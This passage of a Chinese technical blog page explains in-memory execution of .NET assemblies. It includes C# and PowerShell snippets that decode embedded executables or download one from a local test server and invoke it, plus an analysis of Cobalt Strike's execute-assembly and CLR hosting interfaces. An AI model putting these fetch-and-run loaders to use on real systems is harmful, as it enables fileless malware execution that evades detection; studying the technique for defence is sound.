            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>（3）使用Assembly.Load()加载程序集并调用方法</strong></p><p>代码如下：</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>

            <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> <span class="token string">&quot;egrdersg&quot;</span><span class="token punctuation">;</span><span class="token comment">//这里省略一下</span>
            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>          
            <span class="token class-name">Type</span> type <span class="token operator">=</span> assembly<span class="token punctuation">.</span><span class="token function">GetType</span><span class="token punctuation">(</span><span class="token string">&quot;TestApplication.aaa&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">MethodInfo</span> method <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">GetMethod</span><span class="token punctuation">(</span><span class="token string">&quot;bbb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> obj <span class="token operator">=</span> assembly<span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span>            
            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果不需要指定需要调用的方法，调用main函数即可：</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>

            <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> <span class="token string">&quot;xxxxxx&quot;</span><span class="token punctuation">;</span> <span class="token comment">//此处省略一万字</span>
            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 这里的Assembly.Load可以读取字符串形式的程序集，也就是说exe文件不需要写入硬盘</span>
            <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 以exe为例，如果是dll文件就必须指定类名函数名</span>
            <span class="token class-name">MethodInfo</span> method <span class="token operator">=</span> assembly<span class="token punctuation">.</span>EntryPoint<span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 想要指定参数</span>
            <span class="token comment">// object[] parameters = new[] {&quot;-a&quot;,&quot;-b&quot;};</span>
            <span class="token comment">// method.Invoke(null, parameters);</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="方法2" tabindex="-1"><a class="header-anchor" href="#方法2"><span>方法2</span></a></h4><p>远程下载</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code>	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MemoryExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">// 方法1. 把exe文件给base64编码，然后保存在一个常量里, 转成byte数组，放到Assembly.Load函数里</span>
            <span class="token comment">// string base64String = Constants.Base64Exe;</span>
            <span class="token comment">// byte[] buffer = Convert.FromBase64String(base64String);</span>

            <span class="token comment">// 方法2. 远程下载exe，赋值给一个字符串类型的变量</span>
            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> <span class="token function">GetRemoteByte</span><span class="token punctuation">(</span><span class="token string">&quot;http://127.0.0.1:8000/testcalc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">MethodInfo</span> method <span class="token operator">=</span> assembly<span class="token punctuation">.</span>EntryPoint<span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">GetRemoteByte</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> serviceUrl<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">WebClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">DownloadData</span><span class="token punctuation">(</span>serviceUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> buffer<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-3-powershell" tabindex="-1"><a class="header-anchor" href="#_1-3-powershell"><span>1.3. powershell</span></a></h3><blockquote><p>https://idiotc4t.com/code-and-dll-process-injection/.net-fan-she-jia-zai</p></blockquote><p>powershell访问.net程序集的代码比较简单</p><ol><li>把代码写进ps1脚本里</li></ol><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 把代码写进ps1脚本里</span>

<span class="token variable">$Assemblies</span> = <span class="token punctuation">(</span>
    <span class="token string">&quot;System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;System.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL&quot;</span>
<span class="token punctuation">)</span>

<span class="token variable">$Source</span> = @<span class="token string">&quot;
using System;
using System.Reflection;
namespace TestApplication
{
    public class Program
    {
        public static void Main()
        {

            Console.WriteLine(&quot;</span>HELLO<span class="token string">&quot;);
        }
    }
}
&quot;</span>@

<span class="token function">Add-Type</span> <span class="token operator">-</span>ReferencedAssemblies <span class="token variable">$Assemblies</span> <span class="token operator">-</span>TypeDefinition <span class="token variable">$Source</span> <span class="token operator">-</span>Language CSharp
<span class="token namespace">[TestApplication.Program]</span>::Main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>base64编码的字符串</li></ol><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># base64编码的字符串</span>
<span class="token variable">$base64</span> = <span class="token string">&quot;TVqQAAMAAAAEAAA(前面生成的base64编码的程序集)&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$bins</span>  = <span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$invoke</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$bins</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token namespace">[System.Console]</span>::WriteLine<span class="token punctuation">(</span><span class="token variable">$invoke</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$invoke</span><span class="token punctuation">.</span>EntryPoint<span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token variable">$null</span><span class="token punctuation">)</span>


<span class="token comment"># 如果你有参数</span>
<span class="token comment"># $args = New-Object -TypeName System.Collections.ArrayList</span>
<span class="token comment"># [string[]]$strings = &quot;-group=all&quot;,&quot;-full&quot;</span>
<span class="token comment"># $args.Add($strings)</span>
<span class="token comment"># $invoke.EntryPoint.Invoke($null,$args.ToArray());</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>远程加载</li></ol><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 远程下载</span>
<span class="token variable">$invoke2</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::UnsafeLoadFrom<span class="token punctuation">(</span><span class="token string">&quot;http://127.0.0.1:8000/testcalc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token namespace">[System.Console]</span>::WriteLine<span class="token punctuation">(</span><span class="token variable">$invoke2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$invoke2</span><span class="token punctuation">.</span>EntryPoint<span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token variable">$null</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-unmanaged代码内存加载-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-unmanaged代码内存加载-net程序集"><span>2. unmanaged代码内存加载.NET程序集</span></a></h2><p><strong>(execute-assembly)</strong></p><p>当不是用C#编写代码，但还是想要实现上面的操作时，例如Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。<code>execute-assembly</code>功能的实现，必须使用一些来自.NET Framework的核心接口来执行.NET程序集口</p><h3 id="_2-1-clr" tabindex="-1"><a class="header-anchor" href="#_2-1-clr"><span>2.1. CLR</span></a></h3><p>CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境，是.NET Framework的主要执行引擎，作用之一是监视程序的运行：（或者说相当于Java中的JVM）</p><ul><li>在CLR监视之下运行的程序属于”托管的”(managed)代码</li><li>不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</li></ul><p><strong>Hosting</strong> (Unmanaged API Reference) 用于将.NET 程序集加载到任意程序中的API（https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/ ）本次主要关注两种方式，按照.net版本区分：</p><ul><li><p><strong>ICorRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/icorruntimehost-interface</p><p>支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319</p></li><li><p><strong>ICLRRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface</p><p>支持v2.0.50727和v4.0.30319，在.NET Framework 2.0中，ICLRRuntimeHost用于取代ICorRuntimeHost，在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用</p></li></ul><p>下面选择ICLRRuntimeHost介绍：<code>ICLRRuntimeHost</code>、<code>ICLRRuntimeInfo</code> 以及<code>ICLRMetaHost</code> 接口</p>`,41)),s("p",null,[s("a",f,[n[6]||(n[6]=a("ICLRRuntimeHost Interface - .NET Framework | Microsoft Learn")),p(t)])]),n[18]||(n[18]=e('<ul><li><strong>ICLRMetaHost</strong>: 这个接口用于在托管代码中获取关于加载的CLR（Common Language Runtime，.NET Framework的核心组件）的信息。基本上，它提供了一个入口点，允许我们枚举加载到进程中的所有CLR版本，并为特定版本的CLR获取<code>ICLRRuntimeInfo</code>接口。</li><li><strong>ICLRRuntimeInfo</strong>: 一旦你有了表示特定CLR版本的<code>ICLRRuntimeInfo</code>接口，你可以用它来获取CLR运行时的其他接口，例如<code>ICLRRuntimeHost</code>。这个接口还允许你判断这个特定版本的CLR是否已经被加载到进程中。</li><li><strong>ICLRRuntimeHost</strong>: 这是执行.NET程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET程序集，并执行它。具体来说，它的<code>ExecuteInDefaultAppDomain</code>方法可以用来加载和执行.NET程序集。</li></ul><p>综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用<code>ICLRMetaHost</code>来确定哪个CLR版本已加载或可用。然后使用<code>ICLRRuntimeInfo</code>来为这个CLR版本获取<code>ICLRRuntimeHost</code>。最后用<code>ICLRRuntimeHost</code>来加载和执行.NET程序集。</p><h3 id="_2-2-cobalt-strike-execute-assembly流程" tabindex="-1"><a class="header-anchor" href="#_2-2-cobalt-strike-execute-assembly流程"><span>2.2. Cobalt Strike execute-assembly流程</span></a></h3>',3)),s("blockquote",null,[s("p",null,[s("a",h,[n[7]||(n[7]=a(".net程序集内存加载执行技术 | 0pen1的博客")),p(t)])])]),n[19]||(n[19]=e('<p>在Cobalt Strike的代码中找到BeaconConsole.java文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net程序集是否带有参数（具体如何判断请查看CommandParser类）。判断完成使用CommandParser类的popstring方法将execute-assembly的参数赋值给变量，然后调用ExecuteAssembly方法执行程序集。</p><figure><img src="'+A+'" alt="image-20220114182430780" tabindex="0" loading="lazy"><figcaption>image-20220114182430780</figcaption></figure><p>我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。</p><figure><img src="'+u+`" alt="image-20220114182256752" tabindex="0" loading="lazy"><figcaption>image-20220114182256752</figcaption></figure><p>接下来进入spawn方法，可以看到是<strong>通过反射DLL的方法，将invokeassembly.dll注入到进程当中</strong>（这块还没自己实现过），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDLLContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> var3 <span class="token operator">=</span> <span class="token class-name">ReflectiveDLL</span><span class="token punctuation">.</span><span class="token function">findReflectiveLoader</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;Could not find reflective loader in &quot;</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDLLName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ReflectiveDLL</span><span class="token punctuation">.</span><span class="token function">is64</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ignoreToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
               <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ignoreToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">87</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fix</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">obfuscatePostEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_obfuscate</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupSmartInject</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWaitTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addLengthAndString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getShortDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTactic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+r+'" alt="image-20220209135538841" tabindex="0" loading="lazy"><figcaption>image-20220209135538841</figcaption></figure><figure><img src="'+k+'" alt="image-20220117192352767" tabindex="0" loading="lazy"><figcaption>image-20220117192352767</figcaption></figure><p><strong>总结一下</strong>，Cobalt Strike内存加载执行.net程序集大概的过程就是，首先spawn一个进程并传输invokeassembly.dll注入到该进程，invokeassembly.dll实现了在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p><p><strong>那么invokeassembly.dll内部是如何操作的呢？</strong></p><p>TODO:反射dll注入</p><h3 id="_2-3-硬盘加载执行-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-3-硬盘加载执行-net程序集"><span>2.3. 硬盘加载执行.NET程序集</span></a></h3><h4 id="过程" tabindex="-1"><a class="header-anchor" href="#过程"><span>过程</span></a></h4>',13)),s("ol",null,[n[10]||(n[10]=s("li",null,[s("p",null,"初始化ICLRMetaHost接口。")],-1)),n[11]||(n[11]=s("li",null,[s("p",null,"通过ICLRMetaHost获取ICLRRuntimeInfo接口。")],-1)),n[12]||(n[12]=s("li",null,[s("p",null,"通过ICLRRuntimeInfo将 CLR 加载到当前进程并返回运行时接口ICLRRuntimeHost指针。")],-1)),n[13]||(n[13]=s("li",null,[s("p",null,"通过ICLRRuntimeHost.Start()初始化CLR。")],-1)),s("li",null,[n[9]||(n[9]=s("p",null,"通过ICLRRuntimeHost.ExecuteInDefaultAppDomain执行指定程序集(硬盘上)。",-1)),s("p",null,[s("a",w,[n[8]||(n[8]=a("ICLRRuntimeHost::ExecuteInDefaultAppDomain 方法 - .NET Framework | Microsoft Learn")),p(t)])])])]),n[20]||(n[20]=e(`<div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code>	<span class="token function">CLRCreateInstance</span><span class="token punctuation">(</span>CLSID_CLRMetaHost<span class="token punctuation">,</span> IID_ICLRMetaHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iMetaHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
	iMetaHost<span class="token operator">-&gt;</span><span class="token function">GetRuntime</span><span class="token punctuation">(</span>L<span class="token string">&quot;v4.0.30319&quot;</span><span class="token punctuation">,</span> IID_ICLRRuntimeInfo<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iRuntimeInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
